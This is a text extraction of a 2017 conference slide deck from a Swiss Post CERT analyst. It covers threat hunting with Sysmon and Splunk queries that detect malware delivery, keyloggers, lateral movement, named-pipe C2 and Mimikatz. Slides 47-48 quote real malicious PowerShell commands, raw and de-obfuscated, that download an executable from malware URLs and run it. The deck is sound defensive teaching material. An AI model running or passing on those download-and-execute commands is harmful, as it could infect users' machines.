Advanced Incident Detection and Threat Hunting using Sysmon (and Splunk)
Tom Ueltschi, Swiss Post CERT

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 1

C:\> whoami /all

 Tom Ueltschi  Swiss Post CERT / SOC / CSIRT, since 2007 (10 years!)
­ Focus: Malware Analysis, Threat Intel, Threat Hunting, Red Teaming  Talks about «Ponmocup Hunter» (Botconf, DeepSec, SANS DFIR Summit)  BotConf 2016 talk with same title  Member of many trust groups / infosec communities  FIRST SIG member (Malware Analysis, Red Teaming)  Twitter: @c_APT_ure

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 2

Outline

 Introduction on Sysmon and public resources

 Brief recap of BotConf talk with examples

 Threat Hunting & Advanced Detection examples

­ Malware Delivery

­ Persistence Methods

­ Internal Recon

­ Lateral Movement

­ Internal Peer-to-Peer C2 using Named Pipes

­ Detecting Mimikatz (even file-less / in-memory)

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 3

Standing on the Shoulders of Giants

 It's hard to come up with totally new ideas and approaches
 Know and use what's already available out there
 Share experiences what works and how

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 4

Pyramid of Pain
I want to be able to detect this!

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 5

Sqrrl on Threat Hunting

Most examples are belong to here
FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 6

Sqrrl on Threat Hunting

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 7

Sqrrl on Threat Hunting

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 8

MITRE ATT&CK Matrix (Tactics)

 Examples will cover

 Persistence (Registry, Filesystem)

 Discovery / Lateral Movement / Execution (WMI)

 Command and Control (Named Pipes)

 Credential Access (Mimikatz)

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 9

MITRE ATT&CK Matrix (Techniques)

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 10

MITRE ATT&CK Matrix (Techniques)

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 11

MITRE ATT&CK Matrix (DGA)

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 12

MITRE ATT&CK Matrix (T&T)

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 13

MITRE ATT&CK Matrix (ABDC)

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 14

MITRE ATT&CK Matrix
Contributions are welcome

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 15

MITRE Cyber Analytics Repository

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 16

MITRE Cyber Analytics Repository

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 17

MITRE CARET (Analytics  T&T Matrix)

Map Analytics to T&T Matrix
FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 18

MITRE CARET (Analytics  T&T Matrix)
CAR: Exec of susp cmds T&T: Discovery / many

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 19

MITRE CARET (Analytics  T&T Matrix)
CAR: Remote exec via WMI T&T: Execution / WMI

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 20

Threat Hunting Project

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 21

Threat Hunting Project

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 22

ThreatHunter Playbook

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 23

Florian Roth's Sigma Project

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 24

Florian Roth's Sigma Project

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 25

Florian Roth's Sigma Project

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 26

Florian Roth's Sigma Project

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 27

Florian Roth's Sigma Project

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 28

Florian Roth's Sigma Project

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 29

Florian Roth's Sigma Project
Way to go, Neo! 

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 30

Thomas Patzke's EQUEL Project

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 31

Mike Haag's Sysmon DFIR Github

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 32

Why Sysmon? RSA Con Talk M.R.

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 33

Why Sysmon? RSA Con Talk M.R.

Time stomping
DLL / Proc Injection

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 34

Why Sysmon? RSA Con Talk M.R.

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 35

Why Sysmon? RSA Con Talk M.R.
New event types v5 & v6 Not covered in prev talk

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 36

Why Sysmon? RSA Con Talk M.R.

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 37

Why Sysmon? RSA Con Talk M.R.

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 38

Why Sysmon? RSA Con Talk M.R.

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 39

SwiftOnSecurity's Sysmon configs

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 40

Brief Recap of BotConf 2016 Talk

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 41

Recap BotConf Talk (1/2)
Using the free Sysmon tool you can search / alert for known malicious process behaviors
 Image names / paths (wrong paths)
 svchost.exe, %APPDATA%\Oracle\bin\javaw.exe
 CommandLine parameters
 /stext, vssadmin delete shadows, rundll32 qwerty
 Parent- / Child-Process relationships
 winword.exe  explorer.exe, wscript.exe  rundll32.exe
 Process injection
 # winlogon.exe

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 42

Recap BotConf Talk (2/2)
Using the free Sysmon tool you can hunt for suspicious process behaviors
 Lateral movement using admin shares
 ADMIN$, C$, IPC$ (\\127.0.0.1\...)
 Internal C&C P2P comms over named pipes / SMB
 processes using port 445 between workstations
 Rarest processes connecting thru proxy (or directly to Internet)
 count by hashes, IMPHASHes, clients, image names
 Suspicious Powershell activity
 Powershell -EncodedCommand | -enc ...

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 43

Advanced Detection (Adwind RAT)

alert_sysmon_java-malware-infection

JBifrost RAT

index=sysmon SourceName="Microsoft-Windows-Sysmon" EventCode="1" (Users AppData Roaming (javaw.exe OR xcopy.exe)) OR (cmd cscript vbs)
| search Image="*\\AppData\\Roaming\\Oracle\\bin\\java*.exe*" OR (Image="*\\xcopy.exe*" CommandLine="*\\AppData\\Roaming\\Oracle\\*") OR CommandLine="*cscript*Retrive*.vbs*"

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 44

Detecting Keyloggers
 Keyloggers and Password-Stealers abusing NirSoft tools
 Limitless Logger  Predator Pain  HawkEye Keylogger  iSpy Keylogger  KeyBase Keylogger
CommandLine: <PATH-TO-EXE>\*.exe /stext <PATH-TO-TXT>\*.txt CommandLine: <PATH-TO-EXE>\*.exe /scomma ...
index=sysmon SourceName="Microsoft-Windows-Sysmon" EventCode="1" ( stext OR scomma )
| search CommandLine="* /stext *" OR CommandLine="* /scomma *"

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 45

Detecting Keyloggers
 BONUS: detecting new Banking Trojan variant (Heodo/Emotet)

 Link in email to download JS from web server (DHL__Report__*.js)  Executing JS downloads EXE from web server  EXE uses «/scomma» parameter (YARA: NirSoft strings in memory)

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 46

Detecting Keyloggers
 BONUS: detecting new Banking Trojan variant (Heodo/Emotet)

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 47

Malicious PowerShell

index=sysmon SourceName="Microsoft-Windows-Sysmon" EventCode="1" (powershell.exe OR cmd.exe)
| eval CommandLine2=replace(CommandLine,"[ '+\"\^]","") | search (Image="*\\powershell.exe" OR Image="*\\cmd.exe")
CommandLine2="*WebClient*" CommandLine2="*DownloadFile*"

"C:\Windows\System32\cmd.exe" /c powershell -command (("New-Object

Net.WebClient")).("'Do' + 'wnloadfile'").invoke(

'http://unofficialhr.top/tv/homecooking/tenderloin.php',

'C:\Users\***\AppData\Local\Temp\spasite.exe'); & "C:\Users\***\AppData\Local\Temp\spasite.exe"

Remove all obfuscation chars

CommandLine2: C:\Windows\System32\cmd.exe/cpowershell-command((New-ObjectNet.WebClient)).
(Downloadfile).invoke(http://unofficialhr.top/tv/homecooking/tenderloin.php, C:\Users\purpural\AppData\Local\Temp\spasite.exe);&

C:\Users\purpural\AppData\Local\Temp\spasite.exe

 De-obfuscate simple obfuscation techniques Are all (obfuscation) problems solved?

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 48

Malicious PowerShell

cmd.exe /c powershell -c $eba = ('exe'); $sad = ('wnloa'); (( New-Object Net.WebClient )).( 'Do' + $sad + 'dfile' ).invoke( 'http://golub.histosol.ch/bluewin/mail/inbox.php' 'C:\Users\*****\AppData\Local\Temp\doc.' + $eba); start('C:\Users\*****\AppData\Local\Temp\doc.' + $eba)

«De-obfuscated»:
powershell-c$eba=(exe);$sad=(wnloa);((New-ObjectNet.WebClient)).(Do$saddfile) .invoke(http://golub.histosol.ch/bluewin/mail/inbox.phpC:\Users\*****\AppData \Local\Temp\doc.$eba); start(C:\Users\*****\AppData\Local\Temp\doc.$eba)

LNK with Powershell command - embedded in DOCX file (oleObject.bin)

Query doesn't match

Sample from 2016-11-18

«DownloadFile»

d8af6037842458f7789aa6b30d6daefb Abrechnung # 5616147.docx

2b9c71fe5f121ea8234aca801c3bb0d9 Beleg Nr. 892234-32.lnk

Strings from oleObject.bin: E:\TEMP\G\18.11.16\ch1\golub\Beleg Nr. 892234-32.lnk C:\Users\azaz\AppData\Local\Temp\Beleg Nr. 892234-32.lnk

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 49

Processes connecting thru Proxy

index=sysmon SourceName="Microsoft-Windows-Sysmon" EventCode=1 [ search index=sysmon SourceName="Microsoft-Windows-Sysmon" EventCode=3 Image="*\\Users\\*" DestinationHostname="proxy.fqdn" | stats by ComputerName ProcessGuid | fields ComputerName ProcessGuid ]
| fields Hashes ComputerName Image ParentImage | rex field=Hashes ".*MD5=(?<MD5>[A-F0-9]*),IMPHASH=(?<IMPHASH>[A-F0-9]*)" | rex field=Image ".*\\\\Users\\\\(?<username>[^\\\\]+)\\\\.*" | rex field=Image ".*\\\\+(?<proc_name>[^\\\\]+\.[eE][xX][eE]).*" | rex field=ParentImage ".*\\\\+(?<pproc_name>[^\\\\]+\.[eE][xX][eE]).*" | stats dc(ComputerName) AS CLIENTS, dc(MD5) AS CNT_MD5,
dc(Image) AS CNT_IMAGE, values(username) AS Users, values(ComputerName) AS Computers, values(MD5) AS MD5, values(proc_name) AS proc_name, values(pproc_name) AS pproc_name by IMPHASH | where CLIENTS < 15 | sort ­CLIENTS

 IMPHASH = Import Hash
FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 50

SMB traffic between WS

index=sysmon SourceName="Microsoft-Windows-Sysmon" EventCode=3 Initiated=true SourceIp!=DestinationIp DestinationPort=445 Image!=System (SourceHostname="WS*" DestinationHostname="WS*") OR (SourceIp="10.10.*.*" DestinationIp="10.10.*.*")
| stats by ComputerName ProcessGuid | fields ComputerName ProcessGuid
 Search for network connections
 SMB protocol (dst port 445)  Source and destination are workstations (hostname or IP)  Use «ProcessGuid» to correlate with other event types (proc's)
 Search for legitimate SMB servers (filers, NAS)
 Create «whitelist» to exclude as legit dest

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 51

Lateral Movement (admin shares)

CS_Lateral_Movement_psexec

10/18/2016 11:17:12 PM

LogName=Microsoft-Windows-Sysmon/Operational

SourceName=Microsoft-Windows-Sysmon

EventCode=1

EventType=4 Type=Information ...

C:\Windows\system32\services.exe  \\127.0.0.1\ADMIN$\8c0cb58.exe

Message=Process Create:

Image: \\127.0.0.1\ADMIN$\8c0cb58.exe

CommandLine: \\127.0.0.1\ADMIN$\8c0cb58.exe

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

IntegrityLevel: System

ParentImage: C:\Windows\system32\services.exe

ParentCommandLine: C:\Windows\System32\services.exe

 Search for admin share names in image paths

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 52

Lateral Movement (admin shares)

CS_Lateral_Movement_psexec

10/18/2016 11:17:13 PM

LogName=Microsoft-Windows-Sysmon/Operational

SourceName=Microsoft-Windows-Sysmon

EventCode=1 EventType=4 Type=Information ...

C:\Windows\system32\services.exe  \\127.0.0.1\ADMIN$\8c0cb58.exe  C:\Windows\system32\rundll32.exe

Message=Process Create:

Image: C:\Windows\SysWOW64\rundll32.exe

CommandLine: C:\Windows\System32\rundll32.exe

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\SYSTEM

IntegrityLevel: System

ParentImage: \\127.0.0.1\ADMIN$\8c0cb58.exe

ParentCommandLine: \\127.0.0.1\ADMIN$\8c0cb58.exe

 Search for admin share names in image paths

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 53

Lateral Movement (proc injection)

CS_Lateral_Movement_psexec

10/18/2016 11:17:13 PM

LogName=Microsoft-Windows-Sysmon/Operational

SourceName=Microsoft-Windows-Sysmon

EventCode=8 EventType=4 Type=Information

\\127.0.0.1\ADMIN$\8c0cb58.exe # C:\Windows\system32\rundll32.exe

...

Message=CreateRemoteThread detected:

SourceProcessId: 29340

SourceImage: \\127.0.0.1\ADMIN$\8c0cb58.exe

TargetProcessId: 18476

TargetImage: C:\Windows\SysWOW64\rundll32.exe

NewThreadId: 20060

StartAddress: 0x0000000000110000

StartFunction:

 Search for rarest source or target images from proc injection

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 54

Keylogger (proc injection)

CS_Keylogger_injection

10/26/2016 11:56:32 PM

LogName=Microsoft-Windows-Sysmon/Operational

SourceName=Microsoft-Windows-Sysmon

EventCode=8 EventType=4 Type=Information

C:\Windows\SysWOW64\rundll32.exe # C:\Windows\system32\winlogon.exe

...

Message=CreateRemoteThread detected:

SourceProcessId: 17728

SourceImage: C:\Windows\SysWOW64\rundll32.exe

TargetProcessId: 836

TargetImage: C:\Windows\System32\winlogon.exe

NewThreadId: 14236

StartAddress: 0x0000000000C20000

StartFunction:

 Suspicious proc injection into «winlogon.exe»
 Steal user's password while logging on or unlocking screensaver

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 55

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 56

Hunting for Delivery of Malware
 Malicious files downloaded via Browser  Sysmon «FileCreateStreamHash» events generated  Remember the malicious JS files from email links? (Heodo/Emotet)

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 57

Hunting for Delivery of Malware
 Remember that JS Filename from before?
 Let's hunt for that... (DHL__Report__*.js)

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 58

Hunting for Delivery of Malware

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 59

Hunting for Delivery of Malware

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 60

Hunting for Delivery of Malware

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 61

Hunting for Delivery of Malware

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 62

Hunting for Delivery of Malware

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 63

Detecting Persistence Methods
 Hunting for Persistence Methods ­ Registry Keys ­ Filesystem (e.g. Startup folders)

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 64

Detecting Persistence (Registry)
 Searching for «Run» or «RunOnce» keys

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 65

Detecting Persistence (Registry)

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 66

Detecting Persistence (Registry)

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 67

Detecting Persistence (Filesystem)
 Example for «ProcessCreate», not «FileCreate»

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 68

Detecting Persistence (Filesystem)

This should make you go «Hmmm??»

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 69

Detecting Persistence (Filesystem)
 Example for «FileCreate»

 Less than 400 results in > 2 months
 after tuning exclusion list
FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 70

Detecting Persistence (Filesystem)

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 71

Detecting Persistence (Filesystem)

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 72

Detecting Internal Recon

 Internal Recon used as preparation for Lateral Movement  Legit system commands used  Can also be used by sysadmins or users  Baseline and find appropriate thresholds
­ Number of different commands and time window

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 73

Detecting Internal Recon

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 74

Detecting Internal Recon

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 75

Detecting Internal Recon

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 76

Detecting Internal Recon

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 77

Detecting Internal Recon

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 78

Detecting Internal Recon
 3 or more (of 7) different commands executed within 15 min

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 79

Detecting Internal Recon

15 occurences 6 diff cmds
within 15 mins
FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 80

Detecting Internal Recon
«False detections» are possible
Explorer -> cmd.exe

3 diff cmds within 3 mins

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 81

Lateral Movement
 Lateral Movement using WMI for Execution

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 82

ATT&CK TTP on WMI

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 83

Who's (ab-)using WMI
 Point 1

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 84

Who's (ab-)using WMI

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 85

Who's (ab-)using WMI

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 86

Who's (ab-)using WMI

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 87

Who's (ab-)using WMI

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 88

Who's (ab-)using WMI

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 89

Testing with WMImplant
 Testing «command_exec» using WMImplant with PS-ISE

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 90

Testing with WMImplant
 Testing «process_start» using WMImplant with Beacon

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 91

Detecting WMI spawned proc's
 Point 1

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 92

Detecting WMI spawned proc's
 Point 1

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 93

Detecting WMI spawned proc's
 Searching for Child-Process creations of «wmiprvse.exe»  Filtering out «known good» processes

 Don't filter out «Powershell.exe» in general
 Combine with «CommandLine» params
FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 94

Detecting WMI spawned proc's
 Command executions («powershell *$env:*» and IEX, obfusc.)  Processes started (calc.exe, notepad.exe ...)

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 95

Detecting WMI spawned proc's
 Also detecting CS Beacons WMI Lateral Movement method
 «powershell.exe ... -encodedcommand ...»

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 96

Internal P2P C2 using Named Pipes
 Internal Peer-to-Peer C&C using Named Pipes over SMB  Using Cobalt Strike Beacon's features for testing

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 97

Cobalt Strike Features
Only one egress point using HTTP as C&C
Conn thru web proxy

NabbmSSeeMMettwwdBBeePtteeirrpaanneffWWfsfiiccCSS&C
FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 98

Detecting C2 usingNamed Pipes
 Search for Processes
 Connecting through Web Proxy and  Creating Named Pipes

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 99

Detecting C2 usingNamed Pipes

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 100

Detecting C2 usingNamed Pipes

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 101

Detecting C2 usingNamed Pipes
 Search for Processes creating «known malicious» Named Pipes
 with or without «default PipeNames»

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 102

Detecting C2 usingNamed Pipes
 Searching for «custom PipeNames» only

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 103

Detecting C2 usingNamed Pipes
 Searching for «default & custom PipeNames»

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 104

Detecting C2 usingNamed Pipes
 Searching for «default & custom PipeNames»

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 105

Detecting Mimikatz (even file-less)
 Detecting ProcessAccess on LSASS.exe  Idea by Mark Russinovich (RSA talk)

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 106

Detecting Mimikatz
 Point 1

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 107

Detecting Mimikatz
 Point 1

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 108

Detecting Mimikatz
 Point 1

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 109

Detecting Mimikatz
 Search for ProcessAccess of LSASS.exe
 GrantedAccess of: 0x1010, 0x1410, 0x143A  CallTrace: KERNELBASE.dll and (ntdll.dll or UNKNOWN) ...

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 110

Detecting Mimikatz
 Mimikatz executable from Github
 File-based  No «UNKNOWN» from shellcode / injection

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 111

Detecting Mimikatz
 Cobalt Strike Beacon's built-in Mimikatz «logonpasswords»
 File-less  «UNKNOWN» from shellcode / injection

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 112

Detecting Mimikatz
 Invoke-Mimikatz using PowerPick from Cobalt Strike's Beacon
 File-less  «UNKNOWN» from shellcode / injection

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 113

Detecting Mimikatz
 Don't search for specific SourceImage names
 e.g. Rundll32.exe -- it could be really anything! (even cmd.exe )

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 114

Detecting Mimikatz (OpenProcess)

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 115

Detecting Mimikatz (OpenProcess)

FIRST 2017 | Advanced Incident Detection and Threat Hunting using Sysmon and Splunk | Tom Ueltschi | TLP-WHITE

Seite 116

I have some questions...
 Please stand up...  Sit down if you...
 didn't learn anything new (resources, examples)  detect internal C&C using Named Pipes over SMB  detect in-memory / file-less Mimikatz on (all of) your hosts
